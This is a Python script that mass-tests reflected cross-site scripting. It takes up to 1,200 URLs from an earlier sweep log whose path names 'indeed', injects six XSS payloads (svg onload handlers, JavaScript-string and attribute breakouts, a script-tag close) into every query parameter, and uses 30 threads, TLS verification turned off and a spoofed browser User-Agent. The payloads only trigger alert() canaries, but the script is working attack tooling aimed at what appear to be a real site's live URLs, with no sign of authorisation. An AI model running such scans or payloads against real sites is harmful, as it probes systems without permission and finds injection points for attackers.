import json
import re
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
CANARY = "40931"

# a spread of contexts: tag, attribute-break, JS-string, and inert-markup probes
PAYLOADS = [
    ('tag',        f'zq"><svg/onload=alert({CANARY})>'),
    ('jsstr',      f"zq';alert({CANARY});//"),
    ('jsdq',       f'zq";alert({CANARY});//'),
    ('attrbreak',  f'zq" onmouseover=alert({CANARY}) x="'),
    ('closescript', f'zq</script><svg onload=alert({CANARY})>'),
    ('markup',     'zq<b>mark40931</b>'),
]
# markup probe is the honest canary: if <b> survives, the sink is raw HTML


def probe(args):
    url, label, pay = args
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    nq = [(k, pay) for k, _ in q]
    probe_url = urlunsplit((p.scheme, p.netloc, p.path, urlencode(nq), ""))
    try:
        r = requests.get(probe_url, timeout=12, verify=False, headers=UA,
                         allow_redirects=False)
    except Exception:
        return None
    body = r.text or ""
    return {"url": url, "label": label, "status": r.status_code,
            "raw_svg": f"<svg/onload=alert({CANARY})" in body,
            "raw_b": "<b>mark40931</b>" in body,
            "marker": "mark40931" in body,
            "len": len(body)}


def main():
    rows = json.load(open("/opt/watch/logs/indeed/full_matrix.json"))
    open_ = [r["url"] for r in rows if r["status"] == 200 and not r["challenge"]]
    print(f"open targets from the full sweep: {len(open_)}")
    # bound: 1200 URLs x 6 payloads
    open_ = open_[:1200]
    tasks = [(u, lab, pay) for u in open_ for lab, pay in PAYLOADS]
    print(f"tests: {len(tasks)}", flush=True)

    res, hits = [], []
    with ThreadPoolExecutor(max_workers=30) as ex:
        for i, r in enumerate(ex.map(probe, tasks), 1):
            if not r:
                continue
            res.append(r)
            if r["raw_svg"] or r["raw_b"]:
                hits.append(r)
                print(f"!!! {r['label']:10} {r['status']} svg={r['raw_svg']} "
                      f"bold={r['raw_b']} {r['url'][:110]}", flush=True)
            if i % 1000 == 0:
                print(f"  [{i}/{len(tasks)}] raw={len(hits)}", flush=True)
    json.dump(res, open("/opt/watch/logs/indeed/payload_matrix.json", "w"), indent=1)
    print(f"\n[+] raw reflections: {len(hits)}")
    mark = [r for r in res if r["marker"]]
    print(f"[+] responses echoing the marker at all: {len(mark)}")


if __name__ == "__main__":
    main()
